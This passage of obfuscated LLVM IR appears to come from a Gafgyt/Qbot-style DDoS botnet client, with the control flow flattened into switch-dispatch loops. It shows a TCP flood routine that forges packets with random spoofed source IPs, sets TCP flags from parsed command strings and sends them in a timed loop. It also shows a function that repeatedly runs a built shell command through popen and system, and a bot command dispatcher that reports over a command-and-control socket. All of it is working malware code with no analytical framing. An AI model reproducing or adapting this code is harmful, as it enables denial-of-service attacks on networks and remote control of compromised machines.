  %67 = load i32, i32* %11, align 4
  %68 = icmp eq i32 %67, 0
  %69 = select i1 %68, i32 -1120238639, i32 1893519573
  store i32 %69, i32* %switchVar
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  store i32 0, i32* %19, align 4
  store i32 305598452, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %11, align 4
  %73 = sub nsw i32 32, %72
  %74 = shl i32 1, %73
  %75 = sub nsw i32 %74, 1
  %76 = xor i32 %75, -1
  store i32 %76, i32* %19, align 4
  store i32 305598452, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  %78 = load i32, i32* %13, align 4
  %79 = sext i32 %78 to i64
  %80 = add i64 40, %79
  store i64 %80, i64* %.reg2mem2
  %81 = call i8* @llvm.stacksave()
  store i8* %81, i8** %20, align 8
  %.reload4 = load volatile i64, i64* %.reg2mem2
  %82 = alloca i8, i64 %.reload4, align 16
  store i8* %82, i8** %.reg2mem5
  %.reload9 = load volatile i8*, i8** %.reg2mem5
  %83 = bitcast i8* %.reload9 to %struct.iphdr*
  store %struct.iphdr* %83, %struct.iphdr** %21, align 8
  %84 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %85 = bitcast %struct.iphdr* %84 to i8*
  %86 = getelementptr i8, i8* %85, i64 20
  %87 = bitcast i8* %86 to %struct.tcphdr*
  store %struct.tcphdr* %87, %struct.tcphdr** %22, align 8
  %88 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %89 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %90 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %89, i32 0, i32 0
  %91 = load i32, i32* %90, align 4
  %92 = load i32, i32* %19, align 4
  %93 = call i32 @getRandomIP(i32 %92)
  %94 = call i32 @htonl(i32 %93) #13
  %95 = load i32, i32* %13, align 4
  %96 = sext i32 %95 to i64
  %97 = add i64 20, %96
  %98 = trunc i64 %97 to i32
  call void @makeIPPacket(%struct.iphdr* %88, i32 %91, i32 %94, i8 zeroext 6, i32 %98)
  %99 = call i32 @rand_cmwc()
  %100 = trunc i32 %99 to i16
  %101 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %102 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %101, i32 0, i32 0
  %103 = bitcast %union.anon.0* %102 to %struct.anon.1*
  %104 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %103, i32 0, i32 0
  store i16 %100, i16* %104, align 4
  %105 = call i32 @rand_cmwc()
  %106 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %107 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %106, i32 0, i32 0
  %108 = bitcast %union.anon.0* %107 to %struct.anon.1*
  %109 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %108, i32 0, i32 2
  store i32 %105, i32* %109, align 4
  %110 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %111 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %110, i32 0, i32 0
  %112 = bitcast %union.anon.0* %111 to %struct.anon.1*
  %113 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %112, i32 0, i32 3
  store i32 0, i32* %113, align 4
  %114 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %115 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %114, i32 0, i32 0
  %116 = bitcast %union.anon.0* %115 to %struct.anon.1*
  %117 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %116, i32 0, i32 4
  %118 = load i16, i16* %117, align 4
  %119 = and i16 %118, -241
  %120 = or i16 %119, 80
  store i16 %120, i16* %117, align 4
  %121 = load i8*, i8** %12, align 8
  %122 = call i32 @strcmp(i8* %121, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.47, i32 0, i32 0)) #10
  %123 = icmp ne i32 %122, 0
  %124 = select i1 %123, i32 -1485885048, i32 1936026158
  store i32 %124, i32* %switchVar
  br label %loopEnd

; <label>:125:                                    ; preds = %loopEntry
  %126 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %127 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %126, i32 0, i32 0
  %128 = bitcast %union.anon.0* %127 to %struct.anon.1*
  %129 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %128, i32 0, i32 4
  %130 = load i16, i16* %129, align 4
  %131 = and i16 %130, -513
  %132 = or i16 %131, 512
  store i16 %132, i16* %129, align 4
  %133 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %134 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %133, i32 0, i32 0
  %135 = bitcast %union.anon.0* %134 to %struct.anon.1*
  %136 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %135, i32 0, i32 4
  %137 = load i16, i16* %136, align 4
  %138 = and i16 %137, -1025
  %139 = or i16 %138, 1024
  store i16 %139, i16* %136, align 4
  %140 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %141 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %140, i32 0, i32 0
  %142 = bitcast %union.anon.0* %141 to %struct.anon.1*
  %143 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %142, i32 0, i32 4
  %144 = load i16, i16* %143, align 4
  %145 = and i16 %144, -257
  %146 = or i16 %145, 256
  store i16 %146, i16* %143, align 4
  %147 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %148 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %147, i32 0, i32 0
  %149 = bitcast %union.anon.0* %148 to %struct.anon.1*
  %150 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %149, i32 0, i32 4
  %151 = load i16, i16* %150, align 4
  %152 = and i16 %151, -4097
  %153 = or i16 %152, 4096
  store i16 %153, i16* %150, align 4
  %154 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %155 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %154, i32 0, i32 0
  %156 = bitcast %union.anon.0* %155 to %struct.anon.1*
  %157 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %156, i32 0, i32 4
  %158 = load i16, i16* %157, align 4
  %159 = and i16 %158, -2049
  %160 = or i16 %159, 2048
  store i16 %160, i16* %157, align 4
  store i32 968458579, i32* %switchVar
  br label %loopEnd

; <label>:161:                                    ; preds = %loopEntry
  %162 = load i8*, i8** %12, align 8
  %163 = call i8* @strtok(i8* %162, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0)) #2
  store i8* %163, i8** %23, align 8
  store i32 1398896984, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i8*, i8** %23, align 8
  %166 = icmp ne i8* %165, null
  %167 = select i1 %166, i32 -2019003245, i32 205286252
  store i32 %167, i32* %switchVar
  br label %loopEnd

; <label>:168:                                    ; preds = %loopEntry
  %169 = load i8*, i8** %23, align 8
  %170 = call i32 @strcmp(i8* %169, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.49, i32 0, i32 0)) #10
  %171 = icmp ne i32 %170, 0
  %172 = select i1 %171, i32 -1405552895, i32 1521941114
  store i32 %172, i32* %switchVar
  br label %loopEnd

; <label>:173:                                    ; preds = %loopEntry
  %174 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %175 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %174, i32 0, i32 0
  %176 = bitcast %union.anon.0* %175 to %struct.anon.1*
  %177 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %176, i32 0, i32 4
  %178 = load i16, i16* %177, align 4
  %179 = and i16 %178, -513
  %180 = or i16 %179, 512
  store i16 %180, i16* %177, align 4
  store i32 1814379447, i32* %switchVar
  br label %loopEnd

; <label>:181:                                    ; preds = %loopEntry
  %182 = load i8*, i8** %23, align 8
  %183 = call i32 @strcmp(i8* %182, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.50, i32 0, i32 0)) #10
  %184 = icmp ne i32 %183, 0
  %185 = select i1 %184, i32 -386838182, i32 991270835
  store i32 %185, i32* %switchVar
  br label %loopEnd

; <label>:186:                                    ; preds = %loopEntry
  %187 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %188 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %187, i32 0, i32 0
  %189 = bitcast %union.anon.0* %188 to %struct.anon.1*
  %190 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %189, i32 0, i32 4
  %191 = load i16, i16* %190, align 4
  %192 = and i16 %191, -1025
  %193 = or i16 %192, 1024
  store i16 %193, i16* %190, align 4
  store i32 377938105, i32* %switchVar
  br label %loopEnd

; <label>:194:                                    ; preds = %loopEntry
  %195 = load i8*, i8** %23, align 8
  %196 = call i32 @strcmp(i8* %195, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.51, i32 0, i32 0)) #10
  %197 = icmp ne i32 %196, 0
  %198 = select i1 %197, i32 109759497, i32 1608187017
  store i32 %198, i32* %switchVar
  br label %loopEnd

; <label>:199:                                    ; preds = %loopEntry
  %200 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %201 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %200, i32 0, i32 0
  %202 = bitcast %union.anon.0* %201 to %struct.anon.1*
  %203 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %202, i32 0, i32 4
  %204 = load i16, i16* %203, align 4
  %205 = and i16 %204, -257
  %206 = or i16 %205, 256
  store i16 %206, i16* %203, align 4
  store i32 1491448069, i32* %switchVar
  br label %loopEnd

; <label>:207:                                    ; preds = %loopEntry
  %208 = load i8*, i8** %23, align 8
  %209 = call i32 @strcmp(i8* %208, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.52, i32 0, i32 0)) #10
  %210 = icmp ne i32 %209, 0
  %211 = select i1 %210, i32 -1363887496, i32 1716262238
  store i32 %211, i32* %switchVar
  br label %loopEnd

; <label>:212:                                    ; preds = %loopEntry
  %213 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %214 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %213, i32 0, i32 0
  %215 = bitcast %union.anon.0* %214 to %struct.anon.1*
  %216 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %215, i32 0, i32 4
  %217 = load i16, i16* %216, align 4
  %218 = and i16 %217, -4097
  %219 = or i16 %218, 4096
  store i16 %219, i16* %216, align 4
  store i32 314523020, i32* %switchVar
  br label %loopEnd

; <label>:220:                                    ; preds = %loopEntry
  %221 = load i8*, i8** %23, align 8
  %222 = call i32 @strcmp(i8* %221, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.53, i32 0, i32 0)) #10
  %223 = icmp ne i32 %222, 0
  %224 = select i1 %223, i32 -1069479533, i32 829719333
  store i32 %224, i32* %switchVar
  br label %loopEnd

; <label>:225:                                    ; preds = %loopEntry
  %226 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %227 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %226, i32 0, i32 0
  %228 = bitcast %union.anon.0* %227 to %struct.anon.1*
  %229 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %228, i32 0, i32 4
  %230 = load i16, i16* %229, align 4
  %231 = and i16 %230, -2049
  %232 = or i16 %231, 2048
  store i16 %232, i16* %229, align 4
  store i32 146390346, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  %234 = load i32, i32* @mainCommSock, align 4
  %235 = load i8*, i8** %23, align 8
  %236 = call i32 (i32, i8*, ...) @sockprintf(i32 %234, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.54, i32 0, i32 0), i8* %235)
  store i32 146390346, i32* %switchVar
  br label %loopEnd

; <label>:237:                                    ; preds = %loopEntry
  store i32 314523020, i32* %switchVar
  br label %loopEnd

; <label>:238:                                    ; preds = %loopEntry
  store i32 1491448069, i32* %switchVar
  br label %loopEnd

; <label>:239:                                    ; preds = %loopEntry
  store i32 377938105, i32* %switchVar
  br label %loopEnd

; <label>:240:                                    ; preds = %loopEntry
  store i32 1814379447, i32* %switchVar
  br label %loopEnd

; <label>:241:                                    ; preds = %loopEntry
  %242 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0)) #2
  store i8* %242, i8** %23, align 8
  store i32 1398896984, i32* %switchVar
  br label %loopEnd

; <label>:243:                                    ; preds = %loopEntry
  store i32 968458579, i32* %switchVar
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  %245 = call i32 @rand_cmwc()
  %246 = trunc i32 %245 to i16
  %247 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %248 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %247, i32 0, i32 0
  %249 = bitcast %union.anon.0* %248 to %struct.anon.1*
  %250 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %249, i32 0, i32 5
  store i16 %246, i16* %250, align 2
  %251 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %252 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %251, i32 0, i32 0
  %253 = bitcast %union.anon.0* %252 to %struct.anon.1*
  %254 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %253, i32 0, i32 6
  store i16 0, i16* %254, align 4
  %255 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %256 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %255, i32 0, i32 0
  %257 = bitcast %union.anon.0* %256 to %struct.anon.1*
  %258 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %257, i32 0, i32 7
  store i16 0, i16* %258, align 2
  %259 = load i32, i32* %9, align 4
  %260 = icmp eq i32 %259, 0
  %261 = select i1 %260, i32 382767352, i32 1156728489
  store i32 %261, i32* %switchVar
  br label %loopEnd

; <label>:262:                                    ; preds = %loopEntry
  %263 = call i32 @rand_cmwc()
  store i32 672061161, i32* %switchVar
  store i32 %263, i32* %.reg2mem10
  br label %loopEnd

; <label>:264:                                    ; preds = %loopEntry
  %265 = load i32, i32* %9, align 4
  %266 = trunc i32 %265 to i16
  %267 = call zeroext i16 @htons(i16 zeroext %266) #13
  %268 = zext i16 %267 to i32
  store i32 672061161, i32* %switchVar
  store i32 %268, i32* %.reg2mem10
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  %.reload11 = load i32, i32* %.reg2mem10
  %270 = trunc i32 %.reload11 to i16
  %271 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %272 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %271, i32 0, i32 0
  %273 = bitcast %union.anon.0* %272 to %struct.anon.1*
  %274 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %273, i32 0, i32 1
  store i16 %270, i16* %274, align 2
  %275 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %276 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %277 = call zeroext i16 @tcpcsum(%struct.iphdr* %275, %struct.tcphdr* %276)
  %278 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %279 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %278, i32 0, i32 0
  %280 = bitcast %union.anon.0* %279 to %struct.anon.1*
  %281 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %280, i32 0, i32 6
  store i16 %277, i16* %281, align 4
  %.reload8 = load volatile i8*, i8** %.reg2mem5
  %282 = bitcast i8* %.reload8 to i16*
  %283 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %284 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %283, i32 0, i32 2
  %285 = load i16, i16* %284, align 2
  %286 = zext i16 %285 to i32
  %287 = call zeroext i16 @csum(i16* %282, i32 %286)
  %288 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %289 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %288, i32 0, i32 7
  store i16 %287, i16* %289, align 2
  %290 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %291 = load i32, i32* %10, align 4
  %292 = add nsw i32 %290, %291
  store i32 %292, i32* %24, align 4
  store i32 0, i32* %25, align 4
  store i32 827576249, i32* %switchVar
  br label %loopEnd

; <label>:293:                                    ; preds = %loopEntry
  store i32 -1979518868, i32* %switchVar
  br label %loopEnd

; <label>:294:                                    ; preds = %loopEntry
  %295 = load i32, i32* %17, align 4
  %296 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %.reload3 = load volatile i64, i64* %.reg2mem2
  %.reload7 = load volatile i8*, i8** %.reg2mem5
  %297 = call i64 @sendto(i32 %295, i8* %.reload7, i64 %.reload3, i32 0, %struct.sockaddr* %296, i32 16)
  %298 = load i32, i32* %19, align 4
  %299 = call i32 @getRandomIP(i32 %298)
  %300 = call i32 @htonl(i32 %299) #13
  %301 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %302 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %301, i32 0, i32 8
  store i32 %300, i32* %302, align 4
  %303 = call i32 @rand_cmwc()
  %304 = trunc i32 %303 to i16
  %305 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %306 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %305, i32 0, i32 3
  store i16 %304, i16* %306, align 4
  %307 = call i32 @rand_cmwc()
  %308 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %309 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %308, i32 0, i32 0
  %310 = bitcast %union.anon.0* %309 to %struct.anon.1*
  %311 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %310, i32 0, i32 2
  store i32 %307, i32* %311, align 4
  %312 = call i32 @rand_cmwc()
  %313 = trunc i32 %312 to i16
  %314 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %315 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %314, i32 0, i32 0
  %316 = bitcast %union.anon.0* %315 to %struct.anon.1*
  %317 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %316, i32 0, i32 0
  store i16 %313, i16* %317, align 4
  %318 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %319 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %318, i32 0, i32 0
  %320 = bitcast %union.anon.0* %319 to %struct.anon.1*
  %321 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %320, i32 0, i32 6
  store i16 0, i16* %321, align 4
  %322 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %323 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %324 = call zeroext i16 @tcpcsum(%struct.iphdr* %322, %struct.tcphdr* %323)
  %325 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %326 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %325, i32 0, i32 0
  %327 = bitcast %union.anon.0* %326 to %struct.anon.1*
  %328 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %327, i32 0, i32 6
  store i16 %324, i16* %328, align 4
  %.reload6 = load volatile i8*, i8** %.reg2mem5
  %329 = bitcast i8* %.reload6 to i16*
  %330 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %331 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %330, i32 0, i32 2
  %332 = load i16, i16* %331, align 2
  %333 = zext i16 %332 to i32
  %334 = call zeroext i16 @csum(i16* %329, i32 %333)
  %335 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %336 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %335, i32 0, i32 7
  store i16 %334, i16* %336, align 2
  %337 = load i32, i32* %25, align 4
  %338 = load i32, i32* %15, align 4
  %339 = icmp eq i32 %337, %338
  %340 = select i1 %339, i32 -213909989, i32 -1088108803
  store i32 %340, i32* %switchVar
  br label %loopEnd

; <label>:341:                                    ; preds = %loopEntry
  %342 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %343 = load i32, i32* %24, align 4
  %344 = icmp sgt i32 %342, %343
  %345 = select i1 %344, i32 1405519756, i32 -786888608
  store i32 %345, i32* %switchVar
  br label %loopEnd

; <label>:346:                                    ; preds = %loopEntry
  store i32 1663864006, i32* %switchVar
  br label %loopEnd

; <label>:347:                                    ; preds = %loopEntry
  store i32 0, i32* %25, align 4
  store i32 827576249, i32* %switchVar
  br label %loopEnd

; <label>:348:                                    ; preds = %loopEntry
  %349 = load i32, i32* %25, align 4
  %350 = add i32 %349, 1
  store i32 %350, i32* %25, align 4
  store i32 827576249, i32* %switchVar
  br label %loopEnd

; <label>:351:                                    ; preds = %loopEntry
  %352 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %352)
  store i32 1697259631, i32* %switchVar
  br label %loopEnd

; <label>:353:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %351, %348, %347, %346, %341, %294, %293, %269, %264, %262, %244, %243, %241, %240, %239, %238, %237, %233, %225, %220, %212, %207, %199, %194, %186, %181, %173, %168, %164, %161, %125, %77, %71, %70, %66, %63, %57, %54, %47, %46, %40, %35, %31, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #1

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct._IO_FILE*, align 8
  %7 = alloca [80 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %8 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %9 = load i32, i32* %4, align 4
  %10 = add nsw i32 %8, %9
  store i32 %10, i32* %5, align 4
  %11 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %12 = call i32 (i8*, i8*, ...) @sprintf(i8* %11, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.55, i32 0, i32 0)) #2
  %13 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %14 = load i8*, i8** %3, align 8
  %15 = call i8* @strcat(i8* %13, i8* %14) #2
  %16 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %17 = call i8* @strcat(i8* %16, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.56, i32 0, i32 0)) #2
  %18 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %19 = call %struct._IO_FILE* @popen(i8* %18, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.57, i32 0, i32 0))
  store %struct._IO_FILE* %19, %struct._IO_FILE** %6, align 8
  %switchVar = alloca i32
  store i32 141003509, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 141003509, label %20
    i32 -542552258, label %25
    i32 1024152011, label %28
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %5, align 4
  %22 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %23 = icmp sgt i32 %21, %22
  %24 = select i1 %23, i32 -542552258, i32 1024152011
  store i32 %24, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = getelementptr inbounds [80 x i8], [80 x i8]* %7, i32 0, i32 0
  %27 = call i32 @system(i8* %26)
  store i32 141003509, i32* %switchVar
  br label %loopEnd

; <label>:28:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %25, %20, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #4

; Function Attrs: nounwind
declare i8* @strcat(i8*, i8*) #4

declare %struct._IO_FILE* @popen(i8*, i8*) #3

declare i32 @system(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %27 = load i8**, i8*** %4, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 0
  %29 = load i8*, i8** %28, align 8
  %30 = call i32 @strcmp(i8* %29, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.58, i32 0, i32 0)) #10
  store i32 %30, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1439312984, i32* %switchVar
  %.reg2mem2 = alloca i32
  %.reg2mem4 = alloca i32
  %.reg2mem6 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1439312984, label %first
    i32 -1614929451, label %33
    i32 -4621943, label %36
    i32 -2006996646, label %43
    i32 -572980629, label %48
    i32 -477850185, label %55
    i32 1133937387, label %59
    i32 296716365, label %62
    i32 317998278, label %69
    i32 164542750, label %73
    i32 -1617532252, label %74
    i32 -548910258, label %85
    i32 -1379536429, label %89
    i32 106638145, label %90
    i32 273137713, label %97
    i32 -1705652046, label %99
    i32 -1549601085, label %103
    i32 -155146386, label %104
    i32 871808609, label %105
    i32 -968495341, label %106
    i32 473236823, label %113
    i32 824540282, label %117
    i32 -1453582552, label %118
    i32 -196496496, label %125
    i32 1995563441, label %127
    i32 -1085901508, label %131
    i32 1612506859, label %132
    i32 857848142, label %133
    i32 416542283, label %134
    i32 1923448429, label %135
    i32 1860999832, label %142
    i32 1442714160, label %146
    i32 1106934725, label %153
    i32 898337494, label %154
    i32 26611154, label %166
    i32 1893786235, label %169
    i32 2000352890, label %173
    i32 1611200139, label %177
    i32 -1709784207, label %182
    i32 1080093388, label %184
    i32 -205496641, label %185
    i32 81477237, label %189
    i32 -173717025, label %190
    i32 -1311892375, label %195
    i32 1744859761, label %196
    i32 2004044493, label %203
    i32 -1580396716, label %207
    i32 205435291, label %214
    i32 -1157788431, label %221
    i32 409894191, label %228
    i32 1795014949, label %235
    i32 893785483, label %242
    i32 1154890704, label %249
    i32 103474520, label %253
    i32 851163864, label %260
    i32 1179130643, label %261
    i32 1068559317, label %284
    i32 -1394803582, label %289
    i32 -2071877062, label %290
    i32 -1661334344, label %295
    i32 330837493, label %298
    i32 -1675961381, label %302
    i32 2087230636, label %306
    i32 2050772798, label %315
    i32 811194151, label %317
    i32 693198438, label %318
    i32 -1083099608, label %322
    i32 -588861527, label %323
    i32 847598992, label %332
    i32 -1271505781, label %333
    i32 1306114528, label %340
    i32 295835254, label %344
    i32 526523794, label %351
    i32 -720634142, label %358
    i32 -1319377313, label %365
    i32 -7594696, label %372
    i32 -396368139, label %376
    i32 866261454, label %383
    i32 -77114430, label %387
    i32 609728418, label %394
    i32 50667593, label %395
    i32 -533597736, label %417
    i32 -915306888, label %422
    i32 -1835566280, label %423
    i32 -1286726165, label %427
    i32 788478552, label %432
    i32 218649571, label %433
    i32 225375877, label %438
    i32 1856926529, label %441
    i32 1567871966, label %445
    i32 -51494974, label %449
    i32 884310750, label %459
    i32 1712883121, label %461
    i32 1507461526, label %462
    i32 -1865748439, label %466
    i32 -1440669285, label %467
    i32 -217874896, label %477
    i32 1972872975, label %478
    i32 1624925900, label %485
    i32 -156062030, label %486
    i32 -2137398529, label %491
    i32 712736641, label %498
    i32 205014448, label %506
    i32 833340789, label %514
    i32 -1007827240, label %515
    i32 -505784301, label %518
    i32 -499653924, label %522
    i32 -1559336035, label %526
    i32 1882917673, label %529
    i32 1461694224, label %530
    i32 -246398574, label %537
    i32 -1256432509, label %538
    i32 1322387426, label %539
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %31 = icmp ne i32 %.reload, 0
  %32 = select i1 %31, i32 -4621943, i32 -1614929451
  store i32 %32, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i32, i32* @mainCommSock, align 4
  %35 = call i32 (i32, i8*, ...) @sockprintf(i32 %34, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.59, i32 0, i32 0))
  store i32 1322387426, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i8**, i8*** %4, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 0
  %39 = load i8*, i8** %38, align 8
  %40 = call i32 @strcmp(i8* %39, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.60, i32 0, i32 0)) #10
  %41 = icmp ne i32 %40, 0
  %42 = select i1 %41, i32 -572980629, i32 -2006996646
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
